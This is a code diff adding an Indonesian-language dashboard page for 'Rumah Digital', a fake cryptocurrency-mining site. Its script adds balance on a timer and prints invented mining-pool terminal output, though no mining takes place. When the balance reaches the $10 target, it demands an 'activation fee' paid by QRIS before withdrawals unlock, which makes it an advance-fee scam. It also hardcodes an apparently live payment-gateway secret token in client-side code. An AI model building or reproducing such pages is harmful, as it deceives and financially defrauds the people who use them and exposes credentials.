@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#0a0e17">
+  <title>Dashboard - Rumah Digital</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="icon" href="logo.png" type="image/png">
+</head>
+<body>
+  <header class="app-header">
+    <img src="logo.png" alt="RD" class="logo-mini">
+    <span class="page-title">Dashboard</span>
+    <span class="user-chip" id="headerUser">-</span>
+  </header>
+
+  <main class="app-content">
+    <div class="card balance-card">
+      <div class="username-display" id="usernameDisplay">@user</div>
+      <div class="balance-label">Saldo Akun</div>
+      <div class="balance-usd" id="balanceUsd">$0.0000</div>
+      <div class="balance-idr" id="balanceIdr">Rp 0</div>
+    </div>
+
+    <div class="card">
+      <div class="server-status" id="serverStatusBox">
+        <span class="dot"></span>
+        <span class="label" id="serverStatusLabel">Server Online Live</span>
+      </div>
+
+      <div class="terminal" id="terminal"></div>
+
+      <div class="progress-section">
+        <div class="progress-label">
+          <span id="progressText">Tebuskan $10 untuk membuka fitur withdraw</span>
+          <span id="progressPercent">0%</span>
+        </div>
+        <div class="progress-bar">
+          <div class="progress-fill" id="progressFill" style="width: 0%"></div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <!-- Bottom Nav -->
+  <nav class="bottom-nav">
+    <a href="home.html" class="nav-item">
+      <svg viewBox="0 0 24 24"><path d="M3 9.5L12 3l9 6.5V20a1 1 0 01-1 1H4a1 1 0 01-1-1V9.5z"/><path d="M9 21V12h6v9"/></svg>
+      <span>Home</span>
+    </a>
+    <a href="dashboard.html" class="nav-item active">
+      <svg viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>
+      <span>Dashboard</span>
+    </a>
+    <a href="withdraw.html" class="nav-item">
+      <svg viewBox="0 0 24 24"><path d="M12 2v14M12 16l-5-5M12 16l5-5"/><path d="M5 20h14"/></svg>
+      <span>Withdraw</span>
+    </a>
+    <a href="riwayat.html" class="nav-item">
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 3"/></svg>
+      <span>Riwayat</span>
+    </a>
+  </nav>
+
+  <!-- Unlock Payment Modal -->
+  <div class="modal-overlay" id="unlockModal">
+    <div class="modal">
+      <h3>Buka Fitur Withdraw</h3>
+      <p>Bayar biaya aktivasi untuk membuka fitur penarikan saldo.</p>
+      <div class="amount-display" id="unlockAmount">Rp 89.000</div>
+      <div class="qr-wrap" id="qrContainer">
+        <div class="spinner"></div>
+      </div>
+      <p style="font-size:0.8rem;color:var(--text-muted)" id="paymentStatus">Menunggu pembayaran...</p>
+      <button class="btn btn-secondary mt-8" id="btnCloseModal">Tutup</button>
+      <button class="btn btn-primary mt-8 hidden" id="btnCheckPayment">Cek Status Pembayaran</button>
+    </div>
+  </div>
+
+  <script src="data.js"></script>
+  <script>
+    const user = requireAuth();
+    if (!user) throw new Error('Not authenticated');
+
+    const settings = getSettings();
+    const USD_TO_IDR = settings.usdToIdr;
+    const THRESHOLD = settings.unlockThreshold;
+    const FEE_USD = settings.unlockFeeUsd;
+    const INTERVAL = settings.miningIntervalMs;
+
+    const els = {
+      headerUser: document.getElementById('headerUser'),
+      usernameDisplay: document.getElementById('usernameDisplay'),
+      balanceUsd: document.getElementById('balanceUsd'),
+      balanceIdr: document.getElementById('balanceIdr'),
+      serverStatusBox: document.getElementById('serverStatusBox'),
+      serverStatusLabel: document.getElementById('serverStatusLabel'),
+      terminal: document.getElementById('terminal'),
+      progressText: document.getElementById('progressText'),
+      progressPercent: document.getElementById('progressPercent'),
+      progressFill: document.getElementById('progressFill'),
+      unlockModal: document.getElementById('unlockModal'),
+      qrContainer: document.getElementById('qrContainer'),
+      unlockAmount: document.getElementById('unlockAmount'),
+      paymentStatus: document.getElementById('paymentStatus'),
+      btnCloseModal: document.getElementById('btnCloseModal'),
+      btnCheckPayment: document.getElementById('btnCheckPayment')
+    };
+
+    let currentUser = user;
+    let miningTimer = null;
+    let currentTxId = null;
+    let unlockShown = false;
+
+    function refreshUser() {
+      currentUser = getCurrentUser();
+      if (!currentUser) {
+        window.location.href = 'index.html';
+        return;
+      }
+    }
+
+    function updateUI() {
+      refreshUser();
+      els.headerUser.textContent = currentUser.username;
+      els.usernameDisplay.textContent = '@' + currentUser.username;
+      els.balanceUsd.textContent = formatUsd(currentUser.balance);
+      els.balanceIdr.textContent = formatIdr(currentUser.balance, USD_TO_IDR);
+
+      const pct = Math.min(100, (currentUser.balance / THRESHOLD) * 100);
+      els.progressFill.style.width = pct + '%';
+      els.progressPercent.textContent = Math.floor(pct) + '%';
+
+      if (currentUser.unlocked) {
+        els.progressText.textContent = 'Fitur withdraw sudah aktif';
+      } else if (currentUser.balance >= THRESHOLD) {
+        els.progressText.textContent = 'Target tercapai - Aktifkan withdraw';
+        if (!unlockShown) {
+          unlockShown = true;
+          openUnlockModal();
+        }
+      } else {
+        els.progressText.textContent = 'Tebuskan $' + THRESHOLD + ' untuk membuka fitur withdraw';
+      }
+
+      const online = getServerStatus();
+      if (online) {
+        els.serverStatusBox.classList.remove('offline');
+        els.serverStatusLabel.textContent = 'Server Online Live';
+      } else {
+        els.serverStatusBox.classList.add('offline');
+        els.serverStatusLabel.textContent = 'Server Maintenance';
+      }
+    }
+
+    function addTerminalLine(text, cls = '') {
+      const line = document.createElement('div');
+      line.className = 'line' + (cls ? ' ' + cls : '');
+      const time = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+      line.textContent = '[' + time + '] ' + text;
+      els.terminal.appendChild(line);
+      while (els.terminal.children.length > 40) {
+        els.terminal.removeChild(els.terminal.firstChild);
+      }
+      els.terminal.scrollTop = els.terminal.scrollHeight;
+    }
+
+    function getSelectedServer() {
+      const servers = getServers();
+      return servers.find(s => s.id === currentUser.serverId) || servers[0];
+    }
+
+    function doMine() {
+      refreshUser();
+      const online = getServerStatus();
+      const server = getSelectedServer();
+
+      if (!online) {
+        addTerminalLine('status: Server Maintenance', 'warn');
+        currentUser.isMining = false;
+        updateUser(currentUser);
+        return;
+      }
+
+      if (!server || !server.active) {
+        addTerminalLine('Server mining tidak aktif', 'err');
+        return;
+      }
+
+      const earn = Number(server.rate) || 0.03;
+      currentUser.balance = Number((currentUser.balance + earn).toFixed(6));
+      currentUser.isMining = true;
+      currentUser.lastActive = new Date().toISOString();
+      updateUser(currentUser);
+
+      addTerminalLine('Crypto Mining Server +' + formatUsd(earn) + ' | ' + server.name, 'highlight');
+      addTerminalLine('Balance: ' + formatUsd(currentUser.balance), 'dim');
+      updateUI();
+    }
+
+    function startMining() {
+      if (miningTimer) clearInterval(miningTimer);
+      addTerminalLine('Initializing mining node...', 'dim');
+      addTerminalLine('Connecting to pool...', 'dim');
+      const online = getServerStatus();
+      if (online) {
+        addTerminalLine('status: Online Live', 'highlight');
+        const server = getSelectedServer();
+        addTerminalLine('Server: ' + (server ? server.name : 'default') + ' | Rate: $' + (server ? server.rate : 0.03) + '/5s');
+      } else {
+        addTerminalLine('status: Server Maintenance', 'warn');
+      }
+      miningTimer = setInterval(doMine, INTERVAL);
+    }
+
+    // QRIS Payment
+    const ACCOUNT_ID = 'user_6a919341f16b54.69980891';
+    const SECRET_TOKEN = 'sk_live_2b6ad7a3420a509b423ef0198c484293bf00c1cd564b32b2149c5f4deba6aa0d';
+    const API_BASE = 'https://api.buatqris.site';
+
+    async function createQrisPayment() {
+      const amountIdr = Math.round(FEE_USD * USD_TO_IDR);
+      els.unlockAmount.textContent = 'Rp ' + amountIdr.toLocaleString('id-ID');
+      els.qrContainer.innerHTML = '<div class="spinner"></div>';
+      els.paymentStatus.textContent = 'Membuat QRIS...';
+      els.btnCheckPayment.classList.add('hidden');
+
+      try {
+        const body = new URLSearchParams({
+          action: 'api_create_qris',
+          account_id: ACCOUNT_ID,
+          secret_token: SECRET_TOKEN,
+          amount: String(amountIdr),
+          description: 'Aktivasi Withdraw - Rumah Digital',
+          qris_method: 'qris_two',
+          umkm_name: 'RumahDigital'
+        });
+
+        const res = await fetch(API_BASE, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: body
+        });
+        const data = await res.json();
+
+        if (data.success && data.data) {
+          currentTxId = data.data.transaction_id;
+          const qrUrl = data.data.qr_url || (data.data.qris_image ? data.data.qris_image : null);
+          if (qrUrl) {
+            els.qrContainer.innerHTML = '<img src="' + qrUrl + '" alt="QRIS Payment">';
+          } else if (data.data.payment_url) {
+            els.qrContainer.innerHTML = '<a href="' + data.data.payment_url + '" target="_blank" class="btn btn-primary">Buka Halaman Bayar</a>';
+          } else {
+            els.qrContainer.innerHTML = '<p>QR tidak tersedia. Gunakan link bayar.</p>';
+          }
+          els.paymentStatus.textContent = 'Scan QRIS untuk membayar Rp ' + amountIdr.toLocaleString('id-ID');
+          els.btnCheckPayment.classList.remove('hidden');
+        } else {
+          els.qrContainer.innerHTML = '<p style="color:var(--danger)">Gagal membuat QRIS</p>';
+          els.paymentStatus.textContent = data.message || 'Error dari payment gateway';
+        }
+      } catch (err) {
+        console.error(err);
+        els.qrContainer.innerHTML = '<p style="color:var(--danger)">Koneksi gagal</p>';
+        els.paymentStatus.textContent = 'Tidak dapat terhubung ke payment gateway. Coba lagi.';
+      }
+    }
+
+    async function checkPaymentStatus() {
+      if (!currentTxId) return;
+      els.paymentStatus.textContent = 'Memeriksa status...';
+      try {
+        const body = new URLSearchParams({
+          action: 'api_check_status',
+          account_id: ACCOUNT_ID,
+          secret_token: SECRET_TOKEN,
+          transaction_id: String(currentTxId)
+        });
+        const res = await fetch(API_BASE, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: body
+        });
+        const data = await res.json();
+        if (data.success && data.data) {
+          const status = (data.data.status || '').toLowerCase();
+          if (status === 'success' || status === 'paid') {
+            refreshUser();
+            currentUser.unlocked = true;
+            updateUser(currentUser);
+            els.paymentStatus.textContent = 'Pembayaran berhasil! Fitur withdraw aktif.';
+            els.btnCheckPayment.classList.add('hidden');
+            setTimeout(() => {
+              els.unlockModal.classList.remove('show');
+              updateUI();
+            }, 1500);
+          } else {
+            els.paymentStatus.textContent = 'Status: ' + (data.data.status || 'pending') + ' - Belum dibayar';
+          }
+        } else {
+          els.paymentStatus.textContent = data.message || 'Gagal cek status';
+        }
+      } catch (err) {
+        els.paymentStatus.textContent = 'Error koneksi saat cek status';
+      }
+    }
+
+    function openUnlockModal() {
+      els.unlockModal.classList.add('show');
+      createQrisPayment();
+    }
+
+    els.btnCloseModal.addEventListener('click', () => {
+      els.unlockModal.classList.remove('show');
+    });
+
+    els.btnCheckPayment.addEventListener('click', checkPaymentStatus);
+
+    // Init
+    updateUI();
+    startMining();
+
+    // Keep lastActive updated
+    setInterval(() => {
+      refreshUser();
+      if (currentUser) {
+        currentUser.lastActive = new Date().toISOString();
+        updateUser(currentUser);
+      }
+    }, 30000);
+  </script>
+</body>
+</html>
